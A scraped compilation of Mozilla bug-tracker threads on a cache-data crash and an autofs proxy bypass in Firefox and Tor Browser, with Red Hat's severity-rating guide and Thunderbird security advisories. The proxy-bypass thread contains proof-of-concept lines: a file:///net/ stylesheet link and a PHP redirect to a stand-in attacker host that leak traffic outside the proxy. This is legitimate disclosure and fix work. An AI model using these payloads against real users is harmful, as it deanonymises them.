I should note this is incidentally causing problems for people switching between nightly and release right now, because we changed the serialization in [bug 1468222](/show_bug.cgi?id=1468222 "RESOLVED FIXED - Consolidate nsISSLStatus into nsITransportSecurityInfo") (which is how we discovered this).

I got confused about status in 64. This code was removed by <https://hg.mozilla.org/mozilla-central/rev/5cfda4227c6a> so I guess we're just missing uplift requests here.

[Approval Request Comment]
If this is not a sec:{high,crit} bug, please state case for ESR consideration: sec-high
User impact if declined: if a user switches to Nightly (64) and back using the same profile, Firefox will just perma-crash. Also if an attacker can write to the cache directory, they could parley that into arbitrary code execution.
Fix Landed on Version: n/a - the affected code (and thus the bug) was removed in [bug 832834](/show_bug.cgi?id=832834 "RESOLVED FIXED - nsSecureBrowserUIImpl makes babies and kittens cry") by <https://hg.mozilla.org/mozilla-central/rev/2f4adf14e623>
Risk to taking this patch (and alternatives if risky): low - this almost certainly isn't worse. The alternative is uplifting [bug 832834](/show_bug.cgi?id=832834 "RESOLVED FIXED - nsSecureBrowserUIImpl makes babies and kittens cry"), which is a bad idea since it's much larger and riskier.
String or UUID changes made by this patch: none

Since it would require another bug to exploit ([comment 12](/show_bug.cgi?id=1490585#c12 "VERIFIED FIXED - Startup crash in nsSSLStatus::~nsSSLStatus after downgrading profile")), or equivalently a rogue local program, to write to the cache directory and further manifests as a start-up crash, sec-high overstates the severity.

Managed to reproduce using live builds: 64.0a1 -> 63.0b7, 62.0.
Fix verified on the following asan builds: 60.2.1esr(20180919011139), 62.0.2(20180919010706), 63.0b8(20180919010441).
Did not encounter any crash when starting with a new profile.
However, I've noticed that with 62.0.2 and 63.0b8 if trying to access a profile that was opened with a build that crashed; causes these 2 to crash as well.
Scenario:
- create profile with 64;
- open with an affected build;
- open with one of the fixed builds
Do we consider it fixed for these 2(62,63) as well?Status: RESOLVED → VERIFIED

Cristi, do you have links to crash reports for those? I tried creating a new profile in Nightly (64), opening that profile in 62 (it crashed), and then opening the same profile with the release version this patch landed in and it didn't crash for me.Flags: needinfo?(cristian.fogel)

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

| [Description](show_bug.cgi?id=1632062#c0)  Doran Moppert    2018-09-24 02:25:39 UTC  ``` A potentially exploitable crash in `TransportSecurityInfo` used for SSL can be triggered by data stored in the local cache in the user profile directory. This issue is only exploitable in combination with another vulnerability allowing an attacker to write data into the local cache or from locally installed malware. This issue also triggers a non-exploitable startup crash for users switching between the Nightly and Release versions of Firefox if the same profile is used.

| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2018%3A3403)

## Topic

An update for thunderbird is now available for Red Hat Enterprise Linux 6.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Mozilla Thunderbird is a standalone mail and newsgroup client.

This update upgrades Thunderbird to version 60.2.1.

Security Fix(es):

* Mozilla: Memory safety bugs fixed in Firefox 62 and Firefox ESR 60.2 (CVE-2018-12376)
* Mozilla: Use-after-free in driver timers (CVE-2018-12377)
* Mozilla: Use-after-free in IndexedDB (CVE-2018-12378)
* Mozilla: Proxy bypass using automount and autofs (CVE-2017-16541)
* Mozilla: Out-of-bounds write with malicious MAR file (CVE-2018-12379)
* Mozilla: Crash in TransportSecurityInfo due to cached data (CVE-2018-12385)
* Mozilla: Setting a master password post-Firefox 58 does not delete unencrypted previously stored passwords (CVE-2018-12383)

Note: All of the above issues cannot be exploited in Thunderbird by a specially crafted HTML mail, as JavaScript is disabled for mail messages and cannot be enabled. They could be exploited another way in Thunderbird, for example, when viewing the remote content of an RSS feed.

For more details about the security issue(s), including the impact, a CVSS score, and other related information, refer to the CVE page(s) listed in the References section.

Red Hat would like to thank the Mozilla project for reporting these issues. Upstream acknowledges Alex Gaynor, Boris Zbarsky, Christoph Diehl, Christian Holler, Jason Kratzer, Jed Davis, Tyson Smith, Bogdan Tara, Karl Tomlinson, Mats Palmgren, Nika Layzell, Ted Campbell, Nils, Zhanjia Song, Holger Fuhrmannek, Philipp, and Jurgen Gaeremyn as the original reporters.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2018%3A3458)

## Topic

An update for thunderbird is now available for Red Hat Enterprise Linux 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Mozilla Thunderbird is a standalone mail and newsgroup client.

This update upgrades Thunderbird to version 60.2.1.

Security Fix(es):

* Mozilla: Memory safety bugs fixed in Firefox 62 and Firefox ESR 60.2 (CVE-2018-12376)
* Mozilla: Use-after-free in driver timers (CVE-2018-12377)
* Mozilla: Use-after-free in IndexedDB (CVE-2018-12378)
* Mozilla: Proxy bypass using automount and autofs (CVE-2017-16541)
* Mozilla: Out-of-bounds write with malicious MAR file (CVE-2018-12379)
* Mozilla: Crash in TransportSecurityInfo due to cached data (CVE-2018-12385)
* Mozilla: Setting a master password post-Firefox 58 does not delete unencrypted previously stored passwords (CVE-2018-12383)

Note: All of the above issues cannot be exploited in Thunderbird by a specially crafted HTML mail, as JavaScript is disabled for mail messages and cannot be enabled. They could be exploited another way in Thunderbird, for example, when viewing the remote content of an RSS feed.

For more details about the security issue(s), including the impact, a CVSS score, and other related information, refer to the CVE page(s) listed in the References section.

Red Hat would like to thank the Mozilla project for reporting these issues. Upstream acknowledges Alex Gaynor, Boris Zbarsky, Christoph Diehl, Christian Holler, Jason Kratzer, Jed Davis, Tyson Smith, Bogdan Tara, Karl Tomlinson, Mats Palmgren, Nika Layzell, Ted Campbell, Nils, Zhanjia Song, Holger Fuhrmannek, Philipp, and Jurgen Gaeremyn as the original reporters.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

| [Description](/show_bug.cgi?id=1412081#c0)• 7 years ago |
|  | |

Tor Project received a third-party report of a method for content pages to bypass the proxy. STR:
Create a web page with the following:
<head>
<link href='file:///net/12.12.12.12/a.css' rel='stylesheet'>
</head>
Run a "tcpdump port 111" on 12.12.12.12. UDP events are observed that did not pass through the browser proxy.
(A demo is at <https://pearlcrescent.com/tor/am.html>)
I also observed the same thing for <img> tags. This behavior apparently is caused by automount/autofs, which is enabled by default on macOS and installable on Linux.
More information from a colleague:
My quick test on OSX 10.12.x shows that Chrome and Safari (latest versions) are not affected.
It is also interesting that I see the following message in the browser console after the page load completes (i.e., after it gives up on the automounted file):
Security Error: Content at <https://pearlcrescent.com/tor/am.html> may not load or link to file:///net/192.168.1.43/a.css.
Access is blocked (i.e., the CSS does not load, the image does not load), but only after an attempt has been made to open the file (or maybe just traverse its path.

Ouch, I was able to reproduce. There seems to me to be three things going on here:
a) Why are we loading pages that will generate security errors?
b) Is an HTTP page triggering opening a file content process? If so, I think that's a bug, as those will requests will always generate security errors. (I originally thought it was, but now that I see (c) it's possible this is all happening in the sandboxed process)
c) A kernel bug on macOS that sandboxed processes are able to trigger automount, minimal reproducer:
sandbox-exec -p '(version 1) (deny default) (allow process-exec\* (path "/usr/bin/stat")) (allow file-read\* (subpath "/usr") (subpath "/System") (subpath "/private/var/db/dyld"))' /usr/bin/stat /net/12.12.12.12/a.css

For the stylesheet case at least, it seems like the security check is done after the stylesheet loader channel is created. That is probably okay for http: URLs (since creating the channel does not cause any network activity to occur in that case). But tracing through the code path underneath Loader::LoadSheet(), network activity occurs in the file:///net/... case inside the nsFileChannel constructor. Specifically, the call to IsSymlink() hits the network, which is not too surprising since it must call stat() or lstat().
I am not familiar with all of this code, but somehow the security check needs to be done earlier.

The "can web pages load file urls?" is done as part of the usual security checks (CheckMayLoad, CheckLoadURI, content policies like mixed-content blocker and CSP), and given the eventual error message these are still happening. We've found a number of things recently that send extra loads that bypass those. In particular I wonder if this is some kind of preload/prefetch/preconnect speculative load from the parser that bypasses content checks on the incorrect theory "it's OK as long as we check before they end up in the document".
There are multiple prefs that turn off various preloads. Might not take too much time to diagnose whether those are involved or not.
Some of those are
network.http.speculative-parallel-limit (set to 0, though it should only be for http)
network.dns.disablePrefetch (again, file: isn't expected to need dns)
and others that appear to be turned off already, but maybe I missed one that's relevant for file: loads.URL: <https://pearlcrescent.com/tor/am.html>Group: core-security → network-core-securityHas STR: --- → yesKeywords: [csectype-disclosure](/buglist.cgi?keywords=csectype-disclosure&resolution=---),

Adding a check to CheckMayLoad, CheckLoadURI, and/or possibly CheckLoadURIWithPrincial prior to constructing the nsIChannel by calling NS\_NewChannelWithTriggeringPrincipal in Loader::LoadSheet would likely solve this issue for attempting to load file: URIs as stylesheets, but would not solve it universally, if it exists elsewhere.
Another option is to bypass the stat checking when file uris are autofs uris on MacOS and Linux, so file:///net/\*. This would fix the problem for all instances with a file uri at a possible risk of symlink confusion breaking SOP (see [bug 782581](/show_bug.cgi?id=782581 "RESOLVED FIXED - Subverting Same-Origin Policy for Local Contents by Symbolic Link")). Since that case dealt with other Android processes gaining access to sensitive content such as password and cookie databases, this may be safe to break in this one case.

I think that seems a bit brittle to me. Arthur reproduced the issue with <img> tags as well.

Okay, I tried to verify whether Linux is actually affected by this and, surprisingly, I failed so far. Here is what I did on a Debian testing machine and an Ubuntu 14.04:
1) Installed the autofs package
2) Uncommented the /net -hosts line in /etc/auto.master
3) Restarted the machine
4) Captured traffic with tcpdump/wireshark going to a website with the PoC.
5) No non-Tor traffic showed up.
I did this both in Tor Browser and vanilla Firefox (pointed to a local Tor) with different settings.
Does anybody have different steps that show Linux is affected, too?

That is the case for all of our security checks in fact. We create a channel and once we call open2() or also asyncOpen2() on the channel we perform the required security checks, because nothing should have hit the network until this point. Apparently you found a case where that's different. So your evaluation of the situation is accurate.
Since we already have the loadInfo available on the nsFileChannel we could use that information to figure out who triggered the load. I would imagine that the web never needs access to a local file and that any kind of upload scenarios (one would have to verify) are triggered by the SystemPrincipal. I hope that is the case, which would make sense. If all that is true then we could have a very hacky way of blocking. A very raw strawman patch could look like this:

This looks promising. However, I am not exactly sure that we have all the necessary things ready at this point looking at ESR 52 code. It seems to me [bug 1319111](/show_bug.cgi?id=1319111 "RESOLVED FIXED - Expose result principal URL (\"final channel URL\") on LoadInfo, convert current consumers of LOAD_REPLACE") added all the changes you build upon.

I did the same steps and I saw UDP traffic to the IP from the file:// path, on port 28416 (but not on port 111). However it only happens once, probably because the error is cached, so if I want to try it again I need to change the IP in the path.

I am adding Honza since he fixed [Bug 1319111](/show_bug.cgi?id=1319111 "RESOLVED FIXED - Expose result principal URL (\"final channel URL\") on LoadInfo, convert current consumers of LOAD_REPLACE"). Anyway, we added the triggeringPrincipal to the loadInfo within [Bug 1083422](/show_bug.cgi?id=1083422 "RESOLVED FIXED - Add triggeringPrincipal to nsILoadInfo") [1], which landed for FF35. In other words triggeringPrincipal information on the loadinfo for subrequest loads should definitely be accurate for ESR52. I don't fully understand why the final channel URL is important to fix the problem in this bug. As I understand it, if mFileURI [2] would point to e.g. file:///net then we would hit the network at the time we call ::init on nsFileChannel, right? So I don't think [Bug 1319111](/show_bug.cgi?id=1319111 "RESOLVED FIXED - Expose result principal URL (\"final channel URL\") on LoadInfo, convert current consumers of LOAD_REPLACE") is relevant in any way for fixing this bug.

Thanks. You probably don't. I was just wondering how to get the proper loadInfo in the constructor and how to abort properly before we hit the UDP leak.

You can simply access the member mLoadInfo (which is the current loadinfo of the file channel). To abort the load I assume you can just return any NS\_ERROR\_\*. (Maybe NS\_ERROR\_FILE\_TARGET\_DOES\_NOT\_EXIST). I looked at other code within the ::init() function and it seems simply returning an error is all there is to do (once we exactly know what condition for aborting is).

Returning an error does not work as the compiler is complaining about doing so in a constructor. And just accessing `mLoadInfo` and doing things like you did in comment:10 (i.e. `mLoadInfo->TriggeringPrincipal()->GetIsCodebasePrincipal()`) does not work as `mLoadInfo` is `null` it seems (if I am doing a `if (mLoadInfo)` the code in the if-clause is never executed).

Well, this is what I had in mind actually. The loadInfo should not be null at this point. Can we figure out why it is null? As Mark suggested, first we could check that we get the required arguments within newChannel2(). But Maybe newChannel2 is not even called and the channel is created somehow different. Further down within the ::init() method, mLoadinfo is even accessed at the moment, so I am surprised it's null.
Regarding returning the error within the ::init() method, that should work, because there is already code that does the same. Or are you really trying to do it in the constructor and not the ::init() method?Flags: needinfo?(ckerschb)

I agree but we need ESR 52 code for Tor Browser and there is no such thing in nsFileChannel.cpp.[1] I tried to work with Christoph's code there which gave me the results I mentioned in comment:17 and made me wonder in comment:15.

[Bug 1319111](/show_bug.cgi?id=1319111 "RESOLVED FIXED - Expose result principal URL (\"final channel URL\") on LoadInfo, convert current consumers of LOAD_REPLACE") rearranged things like this:
instead of...
channel = new nsFileChannen(url) {
// the code we want to patch
}
channel->SetLoadInfo()
...it does...
channel = new nsFileChannel(url) : mURL(url) {}
channel->SetLoadInfo(loadinfo)
channel->Init() {
// the code we want to patch
}
you don't need to bother with the new resultPrincipalURI (not on esr52).
Regarding the codebase principal check, you should ask Boris, but I think we only use codebase principal for thing we are about to load from unknown (and potentially unsafe) uris, but we may also use codebase principal for moz-extenstion (privileged, I think).
as I understand, we later block the load in CSP. what exactly is the check doing? could we move whole check or the part of it that detects the load blocking here? to be on the safe side...

Partly, yes. The problems is that we hit the newChannel() call in `nsIOService::NewChannelFromURIWithProxyFlagsInternal()` without loadFlags. I guess what we can do is do just return an error in our case if we hit that part. I've implemented that in a patch and I don't see the proxy bypass on my Linux box anymore. mcs/arthur: could you verify that on OS X as well (see the attached patch; I could not give its final version a test yet as I blew my build away accidentally and need to make a full new one but am about to be afk)?

I built Tor Browser alpha (based on ESR52) without and with the patch (23447a7a1b0), for OS X, and tested it as before. I can confirm that the patch stops the proxy bypass for both the CSS and <image> cases. I have also browsed to several sites with the patched version and didn't run into any problems.
Here are my branches:
<https://github.com/arthuredelstein/tor-browser-build/commit/1412081>

Here are my builds in case anyone wants to try it:
<https://arthuredelstein.net/stuff/1412081>
And I applied the patch to the latest Firefox ESR52 and pushed to try. We'll see how it goes:

Okay, we were about to release Tor Browser 7.0.9 with the attached workaround today but Filippo and Nicolas found ways to bypass it. So we stopped.
I don't have a URL handy to test for those new attack vectors but they seem to involve redirect mechanisms. Just pointing a victim to a php file containing:
<?php
header("Location: file:///net/evil-attacker.com/a.css");
?>
is supposed to be enough or creating an .htaccess file with the line

The problem seems to be that the codebase principal check is failing in the redirect case. Christoph: Do we have a different check we could use for both redirect/non-redirect cases? Just using the triggering principal one and preventing channel creation in that case already seems to be the nuclear option as it makes file:// unusable.Flags: needinfo?(ckerschb)

I made a patch that blocks redirects from http(s) to file:// URIs. I'm not sure if it's the ideal approach, but I think it might be a reasonable stopgap for Tor Browser:

(Note this doesn't include Georg's other patch. Both patches will be needed to block everything.)

Dan, under what circumstances do we want to allow an http redirect to a file? I can't think of any off the top of my head (and didn't think we ever allowed it.. but apparently that's not true.). We can certainly block it right in the http channel code if there isn't some use case to support..

A simple test showed that we as expected block http->file redirects. For a quick fix we could add the simple schema check as suggested in [comment 36](/show_bug.cgi?id=1412081#c36 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") to prevent creation of the file channel.
I can't think of a general check from the top of my head to do checkmayload checks prior we do stat() on the file.

At first I had trouble reproducing the HTTP redirect problem. For some reason the problem does occur reliably in the first/default tab in Tor Browser 7.0.x but I can always reproduce it in a new tab. Now I can confirm that the patch from [comment #36](/show_bug.cgi?id=1412081#c36 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") closes the HTTP redirect hole on macOS.
I wonder if there are other similar holes that need to be closed. Script-based techniques such as setting document.location seem to be caught early by existing code that calls ssm->CheckLoadURIFromScript(). I tried using a file:///net/... URL as the src for an <iframe> but that is also blocked early by existing code. I don't think FTP supports redirect to an arbitrary URL. Can anyone think of other protocols or techniques within HTTP or HTML that we should examine? I don't know what netwerk/protocol/gio does but at least that is not included in ESR52 (so it is not an immediate concern for Tor Browser).

A couple of much weaker attacks I noticed:
1. The user could be induced to past file:///net/11.11.11.14/a.css into the URL bar
2. Open an html page with <img src="file:///net/11.11.11.14/a.jpg">. Now choose Page Info, click on the item for the fake image, click "Save As" and choose a location to save the file.
#1 is perhaps a concern. For #1 the most promising fix I can think of is to blacklist URLs of the form "file:///net/\*".
#2 seems unlikely to be a very useful attack vector, but perhaps it would be good to fix as well.

Thanks for those points. Yes, those are scenarios the final patch has to address, I agree. Especially #1. I think, though, we could release an update without addressing them (I am building right now a new Tor Browser including your redirect patch as well \*fingers crossed\*).

> I would imagine that the web never needs access to a local file
You would imagine wrong. See <http://searchfox.org/mozilla-central/rev/aa1343961fca52e8c7dab16788530da31aab7c8d/caps/nsIScriptSecurityManager.idl#129-134> for example.
> Dan, under what circumstances do we want to allow an http redirect to a file?
Again, see our explicit support for allowing some sites, controlled by prefs, to link to file:// URIs.
For the real underlying issue here, the basic problem is that file:// is so messed up, between symlinks, virtual filesystems, etc. Some specific issues with them:
1) Some of our security checks (e.g. CheckMayLoad) \_require\_ that symlinks be resolved
before a check is done, due to the fact that we treat files in the same dir as same-origin
but symlinks can cross directory boundaries. This obviously requires a stat().
2) CheckMayLoad also needs to stat() files because it needs to treat file:///foo and file:///FOO
as same-origin on case-insensitive filesystems.
3) For this bug, it sounds like CheckLoadURI needs to happen \_before\_ we ever stat() the file.
This list is clearly not exhaustive.
To fix issues around symlinks, we resolve symlinks (and hence stat() the file) immediately in nsFileChannel::Init. I urge everyone to read through [bug 670514](/show_bug.cgi?id=670514 "VERIFIED FIXED - Arbitrary File + Directory read via .lnk files on Windows Share") to see why doing it fully lazily (and not caching the stat() results) does not work. That said, we could consider doing it as part of the AsyncOpen security-check process, instead of Init(), and make sure that it happens after the CheckLoadURI call. I \_think\_ that should avoid regressing the issues from [bug 670514](/show_bug.cgi?id=670514 "VERIFIED FIXED - Arbitrary File + Directory read via .lnk files on Windows Share") while allowing us to fix this bug.
I should note that until we moved CheckLoadURI into the channel code, this was slightly less of an issue, because we did not create the channel until \_after\_ CheckLoadURI passed. I don't know whether CheckLoadURI still involved a stat() at that point or not. We would need to check whether it does one.
We definitely need to ensure that we do not ever \_read\_ the file (including for "symlink resolution" or Windows equivalent) until after CheckLoadURI passes in the cases in which reading the file is already a failure (various /dev/tty bits on Linux, Windows special files that hang or crash the process when read, etc).
> 1. The user could be induced to past file:///net/11.11.11.14/a.css into the URL bar
True. The user could also be induced to paste "touch /net/11.11.11.14/a.css" into their terminal... I think fundamentally having autofs enabled is pretty prejudicial to fully controlling your network access. :(
> Now choose Page Info, click on the item for the fake image, click "Save As" and choose a location to save the file.
Right, there's a fundamental tension here between "the page is not allowed to link there" and "the user wants to get the data"... It's worth looking at the history of whether page info ever enforced CheckLoadURI checks on the "Save As" functionality in its media tab and thinking about whether it should.

Something interesting I observed is, without the patch in [comment 36](/show_bug.cgi?id=1412081#c36 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"), some UDP events are detected at the target server, but that is followed by a Security Error appearing in the web console claiming the redirect is not permitted. So it appears that the intention was already to cancel (most) redirects from http to file:///, but the cancellation happens too late to prevent some network leakage. So, in the final patch, the existing code that prevents redirects to file:/// and takes into account certain prefs as mentioned by Boris, perhaps needs to be refactored to a new location such that cancellation happens earlier.

I think Boris added a bunch of very valuable information within [comment 44](/show_bug.cgi?id=1412081#c44 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"). Probably it's best we don't do stat() within ::init() but instead rather move it to asyncOpen2. Or more precisely to the contentSecurityManager right after we preform the CheckLoadURI check.Flags: needinfo?(ckerschb)

From conversation, the Linux sandbox "catches" and blocks that stat() from content, but resolving what is actually being stat() to see if it's allowed leads to the information leak happening on the chrome side. Content will be told the path is not allowed but of course by then the damage is done.
It's reasonable suspect the macOS kernel bug works along similar lines.

Are there strong voices against disabling file: URI loading \*completely\* via a preference that the Tor browser could set? It would be a solution for similar [bug 1413868](/show_bug.cgi?id=1413868 "RESOLVED FIXED - proxy bypass on windows via smb") too.

Do we have UI resources that load from file:// URIs?
If we only want to disable it from web pages, seems like an extension could easily do that...

We can substitute internally to file:// (moz-ext:, resource:, jar:?), so general disabling is not possible, right.
We want to disable only: top level loads (typing in address bar, command line, link clicks), iframes, subresources, general redirects-to, something else?
The distinction could be system principal, but I'm not sure if there can be a case of a system-principal load that is user/content-controlled and not application-controlled.

Apple have notified me that they believe this is fixed in the macOS 10.13.3 beta -- once that's released (they didn't provide a date) we can disclose the bypass mechanism if we like.

If you could work on this, please do. The patches are here:
<https://gitweb.torproject.org/tor-browser.git/commit/?h=tor-browser-52.6.0esr-8.0-2&id=4fbe4216456298af5c68198b3ff0f552f9bb8464>

Now, those were just hacks (and a follow-up bugfix) we deployed to close the critical hole as fast as possible and they are breaking some file:// usage scenarios. I am not sure Mozilla would want those. If so, fine with us. But if you or anyone else could use this opportunity to have a real fix ready for ESR 60 that would be great!Flags: needinfo?(arthuredelstein)

Only for our use case. It's still a proxy bypass, so Tor is carrying an incomplete fix for this that (I think) breaks some functionality like Save t file or something similar. They're going to wind up backporting whatever we come up with to 60; so it would be good to avoid a confusing rebase for them...

you don't need Record()
you have to read (check) the ',' character
the loop should be `while (!p.CheckEOF()) { do stuff; }
you may want to do path.Trim() as you don't skip whitespaces

